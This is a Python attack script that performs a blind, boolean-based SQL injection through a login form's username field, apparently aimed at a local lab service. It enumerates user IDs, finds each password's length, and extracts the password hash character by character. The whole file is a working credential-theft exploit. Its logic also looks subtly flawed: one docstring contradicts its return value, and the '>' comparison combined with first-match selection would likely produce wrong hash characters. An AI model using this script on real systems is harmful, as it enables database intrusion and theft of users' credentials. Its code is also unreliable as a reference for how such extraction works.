import requests

# Function to send an SQL injection query and return True if the needle is found in the response
def make_query(payload):
    """
    Send an SQL injection query and return True if the needle is found in the response.
    """
    r = requests.post(target, data={"username": payload, "password": "password"})
    return needle not in r.text

# Function to construct and send a boolean-based SQL injection query
def boolean_query(offset, user_id, character, operator=">"):
    """
    Construct and send a boolean-based SQL injection query.
    """
    payload = "(SELECT hex(substr(password, {}, 1)) FROM user WHERE id={} AND ascii(substr(password, {}, 1)) {} ascii('{}'))".format(offset + 1, user_id, offset + 1, operator, character)
    return make_query(payload)

# Function to check if the provided user ID exists
def invalid_user(user_id):
    """
    Check if the provided user ID exists.
    """
    payload = "(SELECT id FROM user WHERE id = {}) >= 0".format(user_id)
    return make_query(payload)

# Function to determine the length of the password for the given user ID
def password_length(user_id):
    """
    Determine the length of the password for the given user ID.
    """
    length = 0
    while True:
        payload = "(SELECT length(password) FROM user WHERE id = {} AND length(password) = {})".format(user_id, length)
        if not make_query(payload):
            return length
        length += 1

# Function to extract the password hash for the given user ID
def extract_hash(charset, user_id, password_length):
    """
    Extract the password hash for the given user ID.
    """
    password_hash = ""
    for i in range(password_length):
        for char in charset:
            if boolean_query(i, user_id, char):
                password_hash += char
                break
    return password_hash

# Main entry point
if __name__ == "__main__":
    total_queries = 0
    target = "http://127.0.0.1:8080"
    needle = "Welcome back"
    charset = "0123456789abcdef"

    try:
        while True:
            user_id = input(">> Enter user ID to extract password hash: ")
            user_id = int(user_id)  # Convert user_id to integer
            if not invalid_user(user_id):
                password_len = password_length(user_id)
                print("\t[-] User {} hash length: {}".format(user_id, password_len))
                print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, user_id, password_len)))
            else:
                print("\t[-] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        pass
